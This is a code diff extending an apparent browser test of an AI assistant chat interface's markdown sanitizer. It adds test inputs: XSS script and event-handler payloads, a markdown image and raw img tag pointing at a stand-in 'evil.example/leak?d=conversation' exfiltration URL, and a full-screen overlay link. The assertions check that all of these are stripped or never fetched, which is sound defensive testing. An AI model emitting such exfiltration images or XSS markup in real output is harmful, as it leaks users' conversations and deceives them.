@@ -17,6 +17,8 @@ import {
 
 const captured = setupConsoleCapture();
 
+const EXFIL_URL = "https://evil.example/leak?d=conversation";
+
 // One assistant message exercising markdown rendering plus the injection
 // vectors the sanitizer exists to stop.
 const ASSISTANT_MARKDOWN = [
@@ -29,15 +31,27 @@ const ASSISTANT_MARKDOWN = [
   "",
   "<script>alert('xss')</script>",
   // A disallowed tag carrying an event handler: DOMPurify drops the tag (and
-  // the handler) but keeps the inner text. Avoids the network fetch an
-  // allowlisted <img src=x> would trigger, which would trip the console gate.
+  // the handler) but keeps the inner text.
   "<div onclick=\"alert('xss')\">danger</div>",
+  // Remote images would leak data to the host; classes would let raw HTML
+  // use the bundle's Tailwind utilities to cover the UI.
+  `![exfil](${EXFIL_URL})`,
+  `<img src="${EXFIL_URL}" alt="raw">`,
+  '<a class="fixed inset-0 z-50 bg-white" href="https://example.com">cover</a>',
 ].join("\n");
 
 test.describe("Assistant markdown sanitization (real browser DOM)", () => {
   test("renders markdown and strips XSS vectors while hardening links", async ({
     page,
   }) => {
+    const exfilRequests: string[] = [];
+
+    page.on("request", (request) => {
+      if (request.url().includes("evil.example")) {
+        exfilRequests.push(request.url());
+      }
+    });
+
     await setupUiTest(page, [
       makeConversation({
         id: "md",
@@ -82,6 +96,12 @@ test.describe("Assistant markdown sanitization (real browser DOM)", () => {
     expect(html).not.toContain("alert(");
     expect(html).not.toContain("<div"); // disallowed tag dropped, text kept
     expect(html).toContain("danger");
+
+    // No images, no classes: nothing was fetched and the link kept no styling.
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("class=");
+    await expect(prose.getByRole("link", { name: "cover" })).toBeVisible();
+    expect(exfilRequests).toStrictEqual([]);
 
     expectNoConsoleOutput(captured);
   });
